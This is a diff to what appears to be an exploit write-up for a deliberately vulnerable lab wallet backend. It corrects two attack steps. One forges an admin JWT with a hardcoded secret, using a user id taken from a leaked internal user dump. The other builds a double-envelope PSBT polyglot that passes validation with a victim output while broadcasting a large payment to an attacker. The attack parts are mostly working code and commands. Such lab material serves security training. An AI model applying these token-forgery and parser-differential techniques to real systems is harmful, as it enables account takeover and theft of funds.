@@ -23,7 +23,11 @@ def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=")
 secret = b"devsecret-do-not-use-in-prod-bvbe-2026"
 hdr = b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
 pay = b64(json.dumps({
-  "sub":  "00000000-0000-0000-0000-000000000001",
+  # sub MUST be a real user id from the DB. The handlers verify the JWT
+  # signature/claims but then load the row by `sub`, so a made-up UUID
+  # authenticates then 401s at the row lookup. Grab one from the leaked
+  # user dump (CHAIN D, GET /api/v1/internal/users) or sign up a user.
+  "sub":  "<a-real-user-id>",
   "role": "admin",
   "iss":  "bvbe",
   "aud":  "bvbe-web",
@@ -151,22 +155,20 @@ disagreeing on multi-envelope inputs.
 Construct two envelopes concatenated end-to-end:
 
 ```
-BVBE_PSBT_V1:<base64 PSBT routing to the draft's intended victim — passes validator>
-BVBE_PSBT_V1:<base64 PSBT routing to the attacker — used by finalize+broadcast>
+BVBE_PSBT_V1:<JSON routing to the draft's intended victim — passes validator>
+BVBE_PSBT_V1:<JSON routing to the attacker — used by finalize+broadcast>
 ```
 
 A minimal hand-rolled polyglot (the mock RPC accepts the simplified
 lab envelope format defined in `packages/shared/src/psbt-envelope.ts`):
 
 ```sh
-# Per packages/shared/src/psbt-envelope.ts the lab format is:
-#   BVBE_PSBT_V1:<base64-of-JSON({inputs,outputs,signatures,fee})>
-VICTIM_PSBT=$(printf '%s' \
-  '{"inputs":[],"outputs":[{"address":"<victim>","amountSat":1}],"signatures":2,"fee":1000}' \
-  | base64 -w0)
-ATTACKER_PSBT=$(printf '%s' \
-  '{"inputs":[],"outputs":[{"address":"<attacker>","amountSat":10000000000}],"signatures":2,"fee":1000}' \
-  | base64 -w0)
+# Per packages/shared/src/psbt-envelope.ts the lab format is the marker
+# followed by RAW JSON (NOT base64) — decodePsbt does JSON.parse on the
+# text after the marker, so a base64 body fails to parse:
+#   BVBE_PSBT_V1:{"inputs":[...],"outputs":[...],"signatures":N,"fee":N}
+VICTIM_PSBT='{"inputs":[],"outputs":[{"address":"<victim>","amountSat":1}],"signatures":2,"fee":1000}'
+ATTACKER_PSBT='{"inputs":[],"outputs":[{"address":"<attacker>","amountSat":10000000000}],"signatures":2,"fee":1000}'
 POLYGLOT="BVBE_PSBT_V1:${VICTIM_PSBT}BVBE_PSBT_V1:${ATTACKER_PSBT}"
 ```
 
